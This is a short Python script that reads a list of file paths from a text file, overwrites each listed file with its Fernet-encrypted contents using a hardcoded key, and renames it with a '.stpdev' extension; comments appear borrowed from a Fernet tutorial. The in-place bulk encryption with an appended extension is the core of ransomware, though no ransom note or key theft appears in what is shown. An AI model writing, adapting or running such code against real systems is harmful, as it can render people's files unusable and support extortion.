import os
from wcmatch import glob
from cryptography.fernet import Fernet


def encryptfile(_filename, _decData, _key):

    try:
        fernet = Fernet(_key)

        encMessage = fernet.encrypt(_decData)

        fencode = open(_filename, "w")
        encoding = 'utf-8'
        fencode.write(str(encMessage, encoding))
        fencode.close()

        print(_filename+" >> encrypt success")

        os.rename(_filename, _filename+".stpdev")

    except Exception as e:
        print(e)

if __name__ == "__main__":

    # we will be encryting the below string.
    # message = "hello geeks "
    # message = readdata

    # generate a key for encryptio and decryption
    # You can use fernet to generate
    # the key or use random key generator
    # here I'm using fernet to generate key

    # key = Fernet.generate_key() # gen key new
    key = b'rMfrQC-h0AZ3coj_C6Y80rdU-q_hW1n-tPrKCfiTkM4=' # not gen key

    # Instance the Fernet class with the key

    fernet = Fernet(key)

    # then use the Fernet class instance
    # to encrypt the string string must must
    # be encoded to byte string before encryption

    # print("Private key: ", key)

    # decrypt the encrypted string with the
    # Fernet instance of the key,
    # that was used for encrypting the string
    # encoded byte string is returned by decrypt method,
    # so decode it to string with decode methods

    _rootpath = "D:/encrypt_python3/.list_file.txt"

    f = open(_rootpath, "r", encoding="utf-8")
    readdata = f.read()

    datatoarray = readdata.split("|")
    datatoarray.remove('')
    f.close()

    for fileencodes in datatoarray:

        filename = fileencodes

        try:

            f = open(filename, "rb")
            readdata = f.read()
            f.close()

            decData = readdata

            print(fileencodes)
            encryptfile(fileencodes, decData, key)
        except Exception as e:
            print(e)

